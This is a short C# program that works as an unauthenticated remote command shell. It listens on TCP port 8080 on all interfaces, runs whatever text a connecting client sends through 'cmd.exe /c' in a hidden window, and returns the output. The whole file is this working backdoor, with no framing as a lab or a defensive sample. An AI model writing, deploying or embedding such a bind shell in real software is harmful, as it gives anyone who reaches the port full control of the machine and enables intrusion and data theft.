
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

class Server
{
    static void Main()
    {
        TcpListener listener = new TcpListener(IPAddress.Any, 8080);
        listener.Start();

        Console.WriteLine("Server is listening...");
        TcpClient client = listener.AcceptTcpClient();
        Console.WriteLine("Client connected!");

        NetworkStream stream = client.GetStream();
        byte[] buffer = new byte[1024];

        while (true)
        {
            int bytesRead = stream.Read(buffer, 0, buffer.Length);
            if (bytesRead == 0)
                break;

            string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
            Console.WriteLine("Command: " + command);

            if (command.ToLower() == "exit")
            {
                string goodbye = "Disconnecred from server.";
                byte[] exitData = Encoding.UTF8.GetBytes(goodbye);
                stream.Write(exitData, 0, exitData.Length);
                break;
            }

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            Process process = new Process();
            process.StartInfo = psi;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            string result = string.IsNullOrEmpty(output) ? error : output;
            if (string.IsNullOrEmpty(result))
                result = "Command executed with no output.";

            byte[] data = Encoding.UTF8.GetBytes(result);
            stream.Write(data, 0, data.Length);

        }
        stream.Close();
        client.Close();
        listener.Stop();
    }
}
